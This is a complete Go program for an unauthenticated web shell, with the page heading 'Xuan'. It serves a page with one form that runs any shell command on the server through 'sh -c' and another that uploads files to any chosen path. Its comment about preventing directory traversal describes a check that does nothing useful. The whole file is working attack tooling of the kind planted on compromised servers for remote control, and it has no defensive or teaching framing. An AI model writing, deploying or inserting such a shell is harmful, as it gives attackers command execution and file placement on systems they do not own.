package main

import (
	"fmt"
	"html/template"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath" // - For path manipulation
)

// - htmlTemplate defines the basic HTML structure for the web shell interface.
const htmlTemplate = `
<!DOCTYPE html>
<html>
<head>
    <title>Go Web Shell</title>
    <style>
        body { font-family: sans-serif; margin: 20px; background-color: #f4f4f4; color: #333; }
        .container { background-color: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); max-width: 800px; margin: auto; }
        h1 { color: #0056b3; }
        form { margin-bottom: 20px; padding: 15px; border: 1px solid #ddd; border-radius: 5px; background-color: #f9f9f9; }
        label { display: block; margin-bottom: 5px; font-weight: bold; }
        input[type="text"], input[type="file"], textarea {
            width: calc(100% - 22px);
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box; /* Include padding in width */
        }
        input[type="submit"] {
            background-color: #28a745;
            color: white;
            padding: 10px 15px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }
        input[type="submit"]:hover { background-color: #218838; }
        pre { background-color: #e2e2e2; padding: 10px; border-radius: 4px; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word; }
        .error { color: red; font-weight: bold; }
        .success { color: green; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Xuan</h1>

        <h2>Execute Command</h2>
        <form action="/cmd" method="POST">
            <label for="command">Command:</label>
            <input type="text" id="command" name="command" placeholder="Ex: ls -la" required>
            <input type="submit" value="Execute">
        </form>

        <h2>File Upload</h2>
        <form action="/upload" method="POST" enctype="multipart/form-data">
            <label for="file">Select File:</label>
            <input type="file" id="file" name="file" required>
            <label for="destination">Destination on server (optional, default: original filename):</label>
            <input type="text" id="destination" name="destination" placeholder="Ex: /tmp/new_file.txt">
            <input type="submit" value="Upload">
        </form>

        <hr>
        <h2>Result:</h2>
        <pre>{{ .Output }}</pre>
        {{ if .Error }}
            <p class="error">Error: {{ .Error }}</p>
        {{ end }}
        {{ if .Success }}
            <p class="success">Success: {{ .Success }}</p>
        {{ end }}
    </div>
</body>
</html>
`

// PageData is a struct to pass dynamic content to the HTML template.
type PageData struct {
	Output  string // Command output or general information
	Error   string // Error message to display
	Success string // Success message to display
}

// indexHandler serves the main web page with the command execution and file upload forms.
func indexHandler(w http.ResponseWriter, r *http.Request) {
	tmpl, err := template.New("shell").Parse(htmlTemplate)
	if err != nil {
		http.Error(w, "Error loading HTML template", http.StatusInternalServerError)
		return
	}
	// Initialize with a default message
	tmpl.Execute(w, PageData{Output: "No command executed or file uploaded yet."})
}

// uploadHandler processes file uploads from the web form.
func uploadHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost { // Using http.MethodPost constant for clarity
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	// Retrieve the file from the form field named "file"
	file, header, err := r.FormFile("file")
	if err != nil {
		renderPage(w, "", "Error getting file: "+err.Error(), "")
		return
	}
	defer file.Close() // Ensure the file is closed after processing

	// Get the desired destination filename from the "destination" form field.
	// Defaults to the original filename if no destination is provided.
	destinationPath := r.FormValue("destination")
	if destinationPath == "" {
		destinationPath = header.Filename
	} else {
		// Clean and sanitize the path to prevent directory traversal attempts.
		// A more robust validation might be needed for production environments.
		destinationPath = filepath.Clean(destinationPath)
		// If an absolute path is provided without a root prefix (e.g., just "/tmp/file"),
		// prepend "./" to ensure it's relative to the current working directory,
		// preventing unintended writes to root directories.
		if filepath.IsAbs(destinationPath) && !filepath.HasPrefix(destinationPath, string(filepath.Separator)) {
			destinationPath = "./" + destinationPath
		}
	}

	// Create the output file on the server.
	outFile, err := os.Create(destinationPath)
	if err != nil {
		renderPage(w, "", "Error creating file on server: "+err.Error(), "")
		return
	}
	defer outFile.Close() // Ensure the created file is closed

	// Copy the uploaded file's content to the new file on the server.
	_, err = io.Copy(outFile, file)
	if err != nil {
		renderPage(w, "", "Error saving file: "+err.Error(), "")
		return
	}

	renderPage(w, "", "", fmt.Sprintf("File '%s' successfully uploaded to '%s'!", header.Filename, destinationPath))
}

// cmdHandler executes a command on the server and returns its output.
func cmdHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost { // Using http.MethodPost constant for clarity
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	// Get the command string from the "command" form field.
	command := r.FormValue("command")
	if command == "" {
		renderPage(w, "", "Command not specified.", "")
		return
	}

	// Execute the command using the default shell.
	// For Linux/Unix, "sh -c" is common. For Windows, "cmd.exe", "/C" might be needed.
	// This example assumes a Unix-like target (Linux/macOS).
	cmd := exec.Command("sh", "-c", command)
	output, err := cmd.CombinedOutput() // Capture both stdout and stderr

	outputStr := string(output)
	if err != nil {
		renderPage(w, outputStr, "Error executing command: "+err.Error(), "")
		return
	}
	renderPage(w, outputStr, "", "Command executed successfully!")
}

// renderPage is a helper function to render the HTML template with dynamic data.
func renderPage(w http.ResponseWriter, output string, errStr string, successStr string) {
	tmpl, err := template.New("shell").Parse(htmlTemplate)
	if err != nil {
		http.Error(w, "Error loading HTML template", http.StatusInternalServerError)
		return
	}
	data := PageData{Output: output, Error: errStr, Success: successStr}
	tmpl.Execute(w, data)
}

func main() {
	fmt.Println("Go Web Shell running on port :8080...")

	// - Register HTTP handlers for different routes.
	http.HandleFunc("/", indexHandler)
	http.HandleFunc("/upload", uploadHandler)
	http.HandleFunc("/cmd", cmdHandler)

	// - Attempt to get the port from an environment variable, defaulting to 8080.
	port := os.Getenv("PORT") // Type inferred as string
	if port == "" {
		port = "8080"
	}

	// - Start the HTTP server.
	err := http.ListenAndServe(":"+port, nil)
	if err != nil {
		fmt.Printf("Error starting server: %s\n", err)
	}
}